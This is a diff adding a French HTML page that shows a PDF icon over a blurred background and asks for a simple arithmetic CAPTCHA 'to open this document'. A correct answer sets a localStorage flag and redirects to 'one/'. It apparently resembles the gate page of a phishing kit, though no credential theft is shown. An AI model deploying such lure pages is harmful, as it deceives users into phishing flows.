@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Vérification requise</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: url('https://via.placeholder.com/1500x1000') center/cover no-repeat;
+      backdrop-filter: blur(6px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+    }
+
+    .captcha-container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      width: 350px;
+      text-align: center;
+    }
+
+    .captcha-container img {
+      width: 60px;
+      margin-bottom: 15px;
+    }
+
+    .captcha-container h3 {
+      color: #004AAD;
+      margin-bottom: 10px;
+      font-size: 16px;
+    }
+
+    .captcha-question {
+      font-size: 18px;
+      margin: 20px 0 10px;
+    }
+
+    input[type="number"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #004AAD;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .message {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="captcha-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" alt="PDF icon">
+    <h3>Pour ouvrir ce document, veuillez répondre au CAPTCHA ci-dessous.</h3>
+    <div class="captcha-question" id="captchaQuestion"></div>
+    <input type="number" id="captchaAnswer" placeholder="Votre réponse">
+    <button onclick="checkCaptcha()">Vérifier</button>
+    <div class="message" id="captchaMessage"></div>
+  </div>
+
+  <script>
+    const x = Math.floor(Math.random() * 10);
+    const y = Math.floor(Math.random() * 10);
+    const result = x + y;
+
+    document.getElementById("captchaQuestion").textContent = `Combien font ${x} + ${y} ?`;
+
+    function checkCaptcha() {
+      const userAnswer = parseInt(document.getElementById("captchaAnswer").value);
+      const message = document.getElementById("captchaMessage");
+
+      if (userAnswer === result) {
+        message.style.color = "green";
+        message.textContent = "Accès autorisé. Redirection...";
+        setTimeout(() => {
+		localStorage.setItem("valide","true");
+          window.location.href = "one/"; // ✅ Redirection ici
+        }, 1500);
+      } else {
+        message.style.color = "red";
+        message.textContent = "Mauvaise réponse. Réessayez.";
+      }
+    }
+  </script>
+
+</body>
+</html>
